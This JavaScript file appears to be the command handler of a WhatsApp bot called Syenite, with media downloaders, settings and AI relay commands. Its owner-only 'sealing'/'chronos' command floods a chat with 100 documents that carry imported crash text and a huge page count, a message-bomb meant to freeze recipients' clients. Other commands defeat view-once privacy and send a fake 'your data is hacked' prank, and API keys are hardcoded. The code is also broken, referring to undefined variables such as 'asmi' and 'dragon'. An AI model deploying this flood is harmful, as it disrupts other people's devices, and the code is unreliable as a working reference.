const config = require('./config')
const { getContentType, proto, downloadContentFromMessage, generateWAMessageFromContent, decryptMessageNode } = require("@darkcriminal/baileys")
const { color } = require('./lib/color')
const fs = require('fs')
const chalk = require('chalk')
const yts = require("yt-search")
const path = require('path')
const { ytmp3, ytmp4 } = require('@dark-yasiya/yt-dl.js')
const { sleep, runtime } = require('./lib/darkcriminal')
const { getGroupAdmins } = require('./lib/msg')
const moment = require("moment-timezone");
const os = require('os');
const nexara = require('nexara')
const Jimp = require("jimp");

//bug database
const { syenitetext1 } = require('./lib/bugs/syenitetext1')

const configFilePath = path.join(__dirname, 'config.js'); 

function saveConfig() {
    const configContent = `module.exports = ${JSON.stringify(config, null, 4)};`;
    fs.writeFileSync(configFilePath, configContent, 'utf8');
}

module.exports = syenite = async (syenite, m, chatUpdate) => {
    try {
        const prefix = config.PREFIX
        const type = getContentType(asmi.message)
        const body = (type === 'conversation') ? asmi.message.conversation : (type === 'extendedTextMessage') ? asmi.message.extendedTextMessage.text : (type == 'imageMessage') && asmi.message.imageMessage.caption ? asmi.message.imageMessage.caption : (type == 'videoMessage') && asmi.message.videoMessage.caption ? asmi.message.videoMessage.caption : ''
        const args = body.trim().split(/ +/).slice(1)
        const text = args.join(' ')
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : prefix
        const syenitebody = body.startsWith(pric)
        const pushname = asmi.pushName || 'Nimesh Piyumal'
        const from = m.key.remoteJid
        const sender = asmi.key.fromMe ? (syenite.user.id.split(':')[0]+'@s.whatsapp.net' || syenite.user.id) : (asmi.key.participant || asmi.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = syenite.user.id.split(':')[0]
        const isMe = botNumber.includes(senderNumber)
        const isOwner = config.OWNER_NUMBER.includes(senderNumber) || isMe
        const isCommand = syenitebody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const quoted = type == 'extendedTextMessage' && asmi.message.extendedTextMessage.contextInfo != null ? asmi.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const isGroup = from.endsWith('@g.us')
        const groupMetadata = isGroup ? await syenite.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false

        const reply = (teks) => {
            syenite.sendMessage(m.chat, { text: teks, contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
            }}, { quoted: asmi })
        }

        if(!isOwner && config.MODE === "private") return
        if(!isOwner && isGroup && config.MODE === "inbox") return
        if(!isOwner && !isGroup && config.MODE === "groups") return 

        // if (m.text) {
        //     const { data } = await nexara.get(`https://api.genux.me/api/ai/nexara?query=${m.text}&apikey=GENUX-NIMESH-PIYUMAL`);
        //     if (data && data.message) {
        //         // Check if the response is not empty or invalid
        //         if (data.message.trim() !== "") {
        //             reply(data.message);
        //         } else {
        //             reply("I didn't understand that. Can you please clarify?");
        //         }
        //     } else {
        //         reply("Sorry, I couldn't process your request. Please try again.");
        //     }
        // }

        switch(isCommand){
            case 'jid': {
                reply(from)
            }
            break

            case 'song': {
                try {
                await syenite.sendMessage(from, { react: { text: '🎧', key: m.key }});
                if(!text) return reply("❗ Please enter the song name.")
                let search = await yts(text)
                let info = search.all[0]

                const response = await ytmp3(info.url)
                const caption = `🎶 sʏᴇɴɪᴛᴇ-ᴡᴀʙᴏᴛ ᴍᴜsɪᴄ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ 🎶

┌───────────────────►►
├ 📜 ᴛɪᴛʟᴇ: ${info.title}
├ ⏳ ᴀɢᴏ: ${info.ago}
├ 👀 ᴠɪᴇᴡs: ${info.views}
├ ✍️ ᴀᴜᴛʜᴏʀ: ${info.author.name}
├ 🔗 ᴜʀʟ: ${info.url}
└───────────────────►►

> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`

                const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + info.title }, { quoted: m });

                await syenite.sendMessage(from, { image: { url: info.thumbnail }, caption: caption, contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { audio: { url: response.download.url }, fileName: info.title + '.mp3', mimetype: 'audio/mpeg', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { document: { url: response.download.url }, fileName: info.title + '.mp3', mimetype: 'audio/mpeg', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { delete: wait.key });
                await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
            } catch (e) {
                console.log(e)
                reply(`${e.message}`)
            }}
            break

            case 'video': {
                try {
                await syenite.sendMessage(from, { react: { text: '🎥', key: m.key }});
                if(!text) return reply("❗ Please enter the video name.")
                let search = await yts(text)
                let info = search.all[0]

                const response = await ytmp4(info.url)
                const caption = `🎶 sʏᴇɴɪᴛᴇ-ᴡᴀʙᴏᴛ ᴠɪᴅᴇᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ 🎶

┌───────────────────►►
├ 📜 ᴛɪᴛʟᴇ: ${info.title}
├ ⏳ ᴀɢᴏ: ${info.ago}
├ 👀 ᴠɪᴇᴡs: ${info.views}
├ ✍️ ᴀᴜᴛʜᴏʀ: ${info.author.name}
├ 🔗 ᴜʀʟ: ${info.url}
└───────────────────►►

> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`

                const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + info.title }, { quoted: m });

                await syenite.sendMessage(from, { image: { url: info.thumbnail }, caption: caption, contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { document: { url: response.download.url }, fileName: info.title + '.mp4', mimetype: 'video/mp4', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { delete: wait.key });
                await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
            } catch (e) {
                console.log(e)
                reply(`${e.message}`)
            }}
            break

            case 'ytmp3': {
            try {
                await syenite.sendMessage(from, { react: { text: '🎧', key: m.key }});
                if(!text) return reply("❗ Please enter the song url.")
                let search = await yts(text)
                let info = search.all[0]

                const response = await ytmp3(info.url)

                const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + info.title }, { quoted: m });

                await syenite.sendMessage(from, { audio: { url: response.download.url }, fileName: info.title + '.mp3', mimetype: 'audio/mpeg', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { document: { url: response.download.url }, fileName: info.title + '.mp3', mimetype: 'audio/mpeg', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { delete: wait.key });
                await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
            } catch (e) {
                console.log(e)
                reply(`${e.message}`)
            }}
            break

            case 'ytmp4': {
            try {
                await syenite.sendMessage(from, { react: { text: '🎥', key: m.key }});
                if(!text) return reply("❗ Please enter the video url.")
                let search = await yts(text)
                let info = search.all[0]

                const response = await ytmp4(info.url)

                const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + info.title }, { quoted: m });

                await syenite.sendMessage(from, { document: { url: response.download.url }, fileName: info.title + '.mp4', mimetype: 'video/mp4', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                }}, { quoted: m })

                await syenite.sendMessage(from, { delete: wait.key });
                await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
            } catch (e) {
                console.log(e)
                reply(`${e.message}`)
            }}
            break

            case 'readviewonce': case 'vv': {
                if (!m.quoted) return reply(`Reply to view once message`)
                if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`This is not a view once message`)
                const wait = await syenite.sendMessage(from, { text: '🔓 Decrypting the ViewOnce Image Message...' }, { quoted: m });
                let msg = m.quoted.message
                let type = Object.keys(msg)[0]
                let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
                let buffer = Buffer.from([])
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk])
                }

                if (/video/.test(type)) {
                    return syenite.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
                } else if (/image/.test(type)) {
                    return syenite.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
                }
                let delb = await syenite.downloadAndSaveMediaMessage(media)
                await syenite.sendMessage(from, { delete: wait.key });
                fs.unlinkSync(delb)
            }
            break

            case 'sealing': case 'chronos': {
                if (!isOwner) return reply('This is an owner command ❌')
                const SyeniteDoc = {
                url: "./lib/bugs/x.mp3"
            };
            async function nimeshFreeze(jid){
                  for (let i = 0; i < 100; i++) {
            await syenite.sendMessage(jid, {
                'document': SyeniteDoc,
                'fileName': "🐉Limule Solitarus" + syenitetext1,
                'mimetype': "application/zip",
                'caption': "🐉Limule Solitarus" + syenitetext1,
                'pageCount': 0x3b9aca00,
                'contactVcard': true
            });
            }}
            await nimeshFreeze(m.chat);
            }
            break

            case 'setalive': {
                try {
                    if (!isOwner) return reply(`This is a Owner Command ❌`);
                    if (args.length < 1) return reply(`Example ${prefix + isCommand} හලෝ යාලුවනේ, {pushname} 🙂`);
                    config.ALIVE_MSG = text;
                    saveConfig();
                    reply(`Successfully updated ALIVE_MSG to: ${text} ✅`);
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'setimg': {
                try {
                    if (!isOwner) return reply(`This is a Owner Command ❌`);
                    if (args.length < 1) return reply(`Example ${prefix + isCommand} https://images3.alphacoders.com/135/1353834.jpeg`);
                    config.ALIVE_IMG = text;
                    saveConfig();
                    reply(`Successfully updated ALIVE_IMG to: ${text} ✅`);
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            function getAliveMessage() {
                const time = moment().tz('Asia/Colombo').format('HH:mm:ss');
                const date = moment().tz('Asia/Colombo').format('DD/MM/YYYY');
            
                return config.ALIVE_MSG
                    .replace('{pushname}', pushname)
                    .replace('{runtime}', runtime(process.uptime()))
                    .replace('{time}', time)
                    .replace('{date}', date);
            }

            case 'alive': {
                try {
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
                    const aliveMessage = await getAliveMessage();
                    syenite.sendMessage(from, { image: { url: config.ALIVE_IMG }, caption: aliveMessage }, { quoted: m })
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'setmenu': {
                try {
                    if (!isOwner) return reply(`This is a Owner Command ❌`);
                    if (args.length < 1) return reply(`Example ${prefix + isCommand} හලෝ යාලුවනේ, {pushname} 🙂`);
                    config.MENU_MSG = text;
                    saveConfig();
                    reply(`Successfully updated MENU_MSG to: ${text} ✅`);
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            function getMenuMessage() {
                const time = moment().tz('Asia/Colombo').format('HH:mm:ss');
                const date = moment().tz('Asia/Colombo').format('DD/MM/YYYY');
            
                return config.MENU_MSG
                    .replace('{pushname}', pushname)
                    .replace('{runtime}', runtime(process.uptime()))
                    .replace('{time}', time)
                    .replace('{date}', date);
            }

            case 'menu': {
                try {
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
                    const MenuMessage = await getMenuMessage();
                    syenite.sendMessage(from, { image: { url: config.ALIVE_IMG }, caption: MenuMessage }, { quoted: m })
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'save': {
                try {
                    await syenite.sendMessage(from, { react: { text: `⏳`, key: m.key }});
                    if (!quoted || !(quoted.imageMessage || quoted.videoMessage || quoted.audioMessage || quoted.documentMessage)) {
                        return await reply("❌ Please reply to a valid media message.");
                    }
                    if(m.message && m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo) {
                        const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if(quotedMessage) {
                            if(quotedMessage.imageMessage) {
                                const imageCaption = quotedMessage.imageMessage.caption;
                                
                                const imageUrl = await syenite.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
                                await syenite.sendMessage(from, {
                                    image: { url: imageUrl },
                                    caption: imageCaption,
                                    contextInfo: {
                                      mentionedJid: [m.sender],
                                      forwardingScore: 9999,
                                      isForwarded: true,
                                    },
                                });
            
                                reply('By Auto Saved System 💚')
                                fs.unlinkSync(imageUrl)
                            }
            
                            if(quotedMessage.videoMessage) {
                                const videoCaption = quotedMessage.videoMessage.caption;
                                const videoUrl = await syenite.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
                                await syenite.sendMessage(from, {
                                    video: { url: videoUrl },
                                    caption: videoCaption,
                                    contextInfo: {
                                      mentionedJid: [m.sender],
                                      forwardingScore: 9999,
                                      isForwarded: true,
                                    },
                                });
            
                                reply('By Auto Saved System 💚')
                                fs.unlinkSync(videoUrl)
                            }
                        }
                    }
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'hack': {
                try {
                    const steps = [
                        '💻 *SYENITE BOT හැකිං ආරම්භය...* 💻',
                        '',
                        '*හැකිං මෙවලම් ආරම්භ කිරීම...* 🛠️',
                        '*දුරස්ථ සේවාදායකවලට සම්බන්ධ වීම...* 🌐',
                        '',
                        '```[██████████] 10%``` ⏳',
                        '```[████████████████████] 20%``` ⏳',
                        '```[██████████████████████████████] 30%``` ⏳',
                        '```[████████████████████████████████████████] 40%``` ⏳',
                        '```[██████████████████████████████████████████████████] 50%``` ⏳',
                        '```[████████████████████████████████████████████████████████████] 60%``` ⏳',
                        '```[██████████████████████████████████████████████████████████████████████] 70%``` ⏳',
                        '```[████████████████████████████████████████████████████████████████████████████████] 80%``` ⏳',
                        '```[██████████████████████████████████████████████████████████████████████████████████████████] 90%``` ⏳',
                        '```[████████████████████████████████████████████████████████████████████████████████████████████████████] 100%``` ✅',
                        '',
                        '🔒 *පද්ධති ආරක්ෂාව බිඳ වැටීම: සාර්ථකයි!* 🔓',
                        '🚀 *විධාන ක්‍රියාත්මක කිරීම: සම්පූර්ණයි!* 🎯',
                        '',
                        '*📡 දත්ත සම්ප්‍රේෂණය කරමින්...* 📤',
                        '*🕵️‍♂️ සුපුරුදු බව තහවුරු කරමින්...* 🤫',
                        '*🔧 මෙහෙයුම් අවසන් කිරීම...* 🏁',
                        '*🔧 YURESH ඔබගේ සියලුම දත්ත ලබා ගනී...* 🎁',
                        '',
                        '⚠️ *සටහන:* සියලුම ක්‍රියාමාර්ග ප්‍රදර්ශන අරමුණු සඳහා පමණි.',
                        '⚠️ *මතක තබා ගන්න:* සදාචාරාත්මක හැකිං ක්‍රම පමණක් ආරක්ෂාව තහවුරු කරයි.',
                        '⚠️ *මතක තබා ගන්න:* ශක්තිමත් හැකිං ක්‍රම පමණක් ආරක්ෂාව තහවුරු කරයි.',
                        '',
                        ' *👨‍💻 ඔබගේ දත්ත සාර්ථකව හැක් කර ඇත 👩‍💻☣*'
                    ];
            
                    for (const line of steps) {
                        await syenite.sendMessage(from, { text: line }, { quoted: m });
                        await new Promise(resolve => setTimeout(resolve, 1000)); // Adjust the delay as needed
                    }
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'ping': {
                try {
                    await syenite.sendMessage(from, { react: { text: `♻️`, key: m.key }});
                    const startTime = Date.now()
                    const message = await syenite.sendMessage(from, { text: '*_Pinging..._*' })
                    const endTime = Date.now()
                    const ping = endTime - startTime
                    await syenite.sendMessage(from, { text: `*🧞‍♂️ Syenite Speed... : ${ping}ms*`}, { quoted: message })
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'settings': {
                try {
                    await syenite.sendMessage(from, { react: { text: `⚙️`, key: m.key }});
                    const statusIcon = (status) => {
                        return (status === true || status === 'true' || status === 1) ? "✅" : "❌";
                    };
            
                    // Create the settings message with the updated format
                    let madeSetting = `╭───⚙️ *${config.BOT_NAME} Settings* ⚙️───╮
│
│ 🟢 *➤ Auto Read Status*: ${statusIcon(config.AUTO_READ_STATUS)}
│ 🔴 *➤ Anti Delete*: ${statusIcon(config.ANTI_DELETE)}
│ 🟢 *➤ Mode*: ${config.MODE}
│ 🌅 *➤ Alive Image*: [*View Image*](${config.ALIVE_IMG})
│ ✉️ *➤ Alive Message*: ${config.ALIVE_MSG}
│ ⌨️ *➤ Prefix*: *[ ${config.PREFIX} ]*
│
╰──────────────────────────╯

> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`;

                    await syenite.sendMessage(from, {
                        image: { url: config.ALIVE_IMG },
                        caption: madeSetting
                    }, { quoted: m });
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'del': 
            case 'delete': {
                try {
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
                    if (!quoted) return reply(`❌ Please reply to the message you want me to delete.`);

                    // Check if the user is the owner or admin in a group
                    if (m.isGroup && !isOwner && !isAdmins) {
                        return reply(`❌ This command can only be used by group admins or the bot owner.`);
                    }

                    const key = {
                        remoteJid: m.chat, // Chat (group or private) where the message is located
                        fromMe: quoted.extendedTextMessage.fromMe, // Check if the message was sent by the bot
                        id: quoted.extendedTextMessage.id, // ID of the quoted message
                        participant: quoted.extendedTextMessage.participant || m.chat // Sender of the message
                    };
            
                    // Send the delete request
                    await syenite.sendMessage(from, { delete: key });
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'xv': 
            case 'xvideos': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🎥`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a query.`);

                    const { data } = await nexara.get(`https://www.dark-yasiya-api.site/search/xvideo?text=${text}`)

                    if (!data.result || data.result.length === 0) {
                        return reply(`❌ No results found for "${text}".`);
                    }

                    const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + data.result[0].title }, { quoted: m });

                    const response = await nexara.get(`https://www.dark-yasiya-api.site/download/xvideo?url=${data.result[0].url}`)

                    await syenite.sendMessage(from, { image: { url: response.data.result.image }, caption: 'Syenite 🐿️ - ' + data.result[0].title, contextInfo: {
                    forwardingScore: 9999999,
                    isForwarded: true,
                    }}, { quoted: m })

                    await syenite.sendMessage(from, { document: { url: response.data.result.dl_link }, fileName: data.result[0].title + '.mp4', mimetype: 'video/mp4', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo: {
                    forwardingScore: 9999999,
                    isForwarded: true,
                    }}, { quoted: m })

                    await syenite.sendMessage(from, { delete: wait.key });
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'apk': {
                try {
                    await syenite.sendMessage(from, { react: { text: `📦`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a query.`);

                    const nameSearch = await nexara.get(`https://www.dark-yasiya-api.site/search/apk?text=${text}`)
                    const { data } = await nexara.get(`https://www.dark-yasiya-api.site/download/apk?id=${nameSearch.data.result.data[0].id}`)
                    const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + data.result.name }, { quoted: m });

                    await syenite.sendMessage(from, { image: { url: data.result.image }, caption: `Name: ${data.result.name}\nLast Update: ${data.result.lastUpdate}\nSize: ${data.result.size}\nPackage: ${data.result.package}`, contextInfo: {
                    forwardingScore: 9999999,
                    isForwarded: true,
                    }}, { quoted: m })

                    await syenite.sendMessage(from, { document: { url: data.result.dl_link }, fileName: data.result.name + '.apk', mimetype: 'application/vnd.android.package-archive', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo: {
                    forwardingScore: 9999999,
                    isForwarded: true,
                    }}, { quoted: m })

                    await syenite.sendMessage(from, { delete: wait.key });
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }});
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'tiktok':
            case 'tk': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🎥`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a video url.`);

                    const api = await nexara.get(`https://api.genux.me/api/download/tiktok?url=${text}&apikey=GENUX-NIMESH-PIYUMAL`)

                    const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + api.data.result.title }, { quoted: m})

                    await syenite.sendMessage(from, { video: { url: api.data.result.nowm }, mimetype: 'video/mp4', fileName: api.data.result.title + '.mp4', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo:{
                    forwardingScore: 9999999, 
                    isForwarded: true  }}, { quoted: m })

                    await syenite.sendMessage(from, { audio: { url: api.data.result.audio }, mimetype: 'audio/mpeg', fileName: api.data.result.title + '.mp3', contextInfo:{
                    forwardingScore: 9999999, 
                    isForwarded: true  }}, { quoted: m })
                        
                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }})
                    await dragon.sendMessage(from, { delete: wait.key })     
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'fb':
            case 'facebook': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🎥`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a video url.`);

                    const res = await nexara.get(`https://api.genux.me/api/download/fb?url=${text}&apikey=GENUX-NIMESH-PIYUMAL`)

                    const wait = await syenite.sendMessage(from, { text: '⏳ Please wait.. ' + res.data.result.result[0].quality }, { quoted: m})

                    await syenite.sendMessage(from, { video: { url: res.data.result.result[0].url }, mimetype: 'video/mp4', fileName: res.data.result.result[0].quality + '.mp4', caption: '> 🛠️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ', contextInfo:{
                    forwardingScore: 9999999, 
                    isForwarded: true  }}, { quoted: m })

                    await syenite.sendMessage(from, { react: { text: `✅`, key: m.key }})
                    await syenite.sendMessage(from, { delete: wait.key }) 
                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'img': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🌅`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a query.`);

                    let gis = require("async-g-i-s");

                    let name1 = text.split("|")[0]

                    for (let i = 0; i < 5; i++) {

                        let n = await gis(name1)
                        images = n[Math.floor(Math.random() * n.length)].url;
                            let buttonMessage = {
                                image: {
                                    url: images,
                                },
                                caption: `> ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`,
                                headerType: 4,
                            };
                            syenite.sendMessage(m.chat, buttonMessage, {
                                quoted: m,
                            });
                    }

                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'news': {
                try {
                    await syenite.sendMessage(from, { react: { text: `📰`, key: m.key }});
                    const api = await nexara.get(`https://api.genux.me/api/news/hiru-news?apikey=GENUX-NIMESH-PIYUMAL`);
                    const newsData = api.data.result[0];

                    if (!newsData || newsData.length === 0) {
                        return reply('❌ No news data found. Please try again later.');
                    }

                    await syenite.sendMessage(m.chat, {
                        image: { url: newsData.image },
                        caption: `📰 *${newsData.title}*\n\n${newsData.description}\n\n📅 *Published:* ${newsData.published}\n\n🔗 *Link:* ${newsData.link}\n\n> ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`,
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                        },
                    }, { quoted: m });

                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'wabeta': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🪀`, key: m.key }});
                    const api = await nexara.get(`https://api.genux.me/api/news/wabetainfo?platform=android&apikey=GENUX-NIMESH-PIYUMAL`);
                    const newsData = api.data.result[0];

                    if (!newsData || newsData.length === 0) {
                        return reply('❌ No news data found. Please try again later.');
                    }

                    await syenite.sendMessage(m.chat, {
                        image: { url: 'https://i.postimg.cc/Z5dD1YbF/New-Project.png' },
                        caption: `📰 *${newsData.title}*\n\n${newsData.description}\n\n📅 *Published:* ${newsData.published}\n\n🔗 *Link:* ${newsData.url}\n\n> ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙʏ ɴɪᴍᴇsʜ ᴘɪʏᴜᴍᴀʟ`,
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                        },
                    }, { quoted: m });

                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'ai': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🪀`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a query.`);
                    const { data } = await nexara.get(`https://api.genux.me/api/ai/nexara?query=${text}&apikey=GENUX-NIMESH-PIYUMAL`);
                    await syenite.sendMessage(m.chat, {
                        text: data.message,
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                        },
                    }, { quoted: m });

                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'gpt': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🪀`, key: m.key }});
                    if (!text) return reply(`❌ Please provide a query.`);
                    const { data } = await nexara.get(`https://www.dark-yasiya-api.site/ai/letmegpt?q=${text}`);
                    await syenite.sendMessage(m.chat, {
                        text: data.result,
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                        },
                    }, { quoted: m });

                } catch (e) {
                    console.log(e);
                    reply(`${e.message}`);
                }
            }
            break

            case 'stickersearch': {
                try {
                    await syenite.sendMessage(from, { react: { text: `🪀`, key: m.key }});
            
                    if (!text) return reply(`❌ Please provide a query.`);
            
                    const { data } = await nexara.get(`https://www.dark-yasiya-api.site/download/sticker?text=${text}`);
            
                    if (!data.result || !data.result.stickers || data.result.stickers.length === 0) {
                        return reply(`❌ No stickers found for the given query.`);
                    }
            
                    for (let i = 0; i < 5; i++) {
                    const randomSticker = data.result.stickers[Math.floor(Math.random() * data.result.stickers.length)];
                    await syenite.sendMessage(from, { sticker: { url: randomSticker } }, { quoted: m });
                    }
                } catch (e) {
                    console.log(e);
                    reply(`❌ An error occurred: ${e.message}`);
                }
            }
            break;

            case 'antidelete':
                if (!isOwner) return reply(`This is a Owner Command ❌`)
                if (args.length < 1) return reply(`Example ${prefix + isCommand} on/off`)
                if (text === 'on') {
                    config.ANTI_DELETE = true
                    saveConfig()
                    reply(`Successfully changed anti delete to ${text} ✅`)
                } else if (text === 'off') {
                    config.ANTI_DELETE = false
                    saveConfig()
                    reply(`Successfully changed anti delete to ${text} ✅`)
                }
            break

            case 'autostatus':
                if (!isOwner) return reply(`This is a Owner Command ❌`)
                if (args.length < 1) return reply(`Example ${prefix + isCommand} on/off`)
                if (text === 'on') {
                    config.AUTO_READ_STATUS = true
                    saveConfig()
                    reply(`Successfully changed auto status to ${text} ✅`)
                } else if (text === 'off') {
                    config.AUTO_READ_STATUS = false
                    saveConfig()
                    reply(`Successfully changed auto status to ${text} ✅`)
                }
            break

            case 'mode':
                if (!isOwner) return reply(`This is a Owner Command ❌`)
                if (args.length < 1) return reply(`Example ${prefix + isCommand} public/private`)
                if (text === 'public') {
                    config.MODE = 'public'
                    saveConfig()
                    reply(`Successfully changed mode to ${text} ✅`)
                } else if (text === 'private') {
                    config.MODE = 'private'
                    saveConfig()
                    reply(`Successfully changed mode to ${text} ✅`)
                }
            break

            case 'readmore': {
                await syenite.sendMessage(from, { react: { text: `🔥`, key: m.key }});
                await reply(text.replace(/\+/g, (String.fromCharCode(8206)).repeat(4001)))
            }
            break

            case 'restart': {
                if (!isOwner) return reply(`This is a Owner Command ❌`)
                await syenite.sendMessage(from, { react: { text: `🔄`, key: m.key }});
                const { exec } = require("child_process")
                reply('*සියලුම කාර්යයන් නතර කර බොට් නැවත ආරම්භ කිරීම...*')
                await sleep(1500)
                exec("pm2 restart all")
            }
            break

        }
    }  catch(e){
        console.log(e.message)
        syenite.sendMessage("94786802371@s.whatsapp.net", { text: "හෙලෝ Nimesh Piyumal, දෝෂයක් ඇති බව පෙනේ, කරුණාකර එය නිවැරදි කරන්න." + e.message, 
            contextInfo:{
            forwardingScore: 9999999, 
            isForwarded: true
        }})
    }
}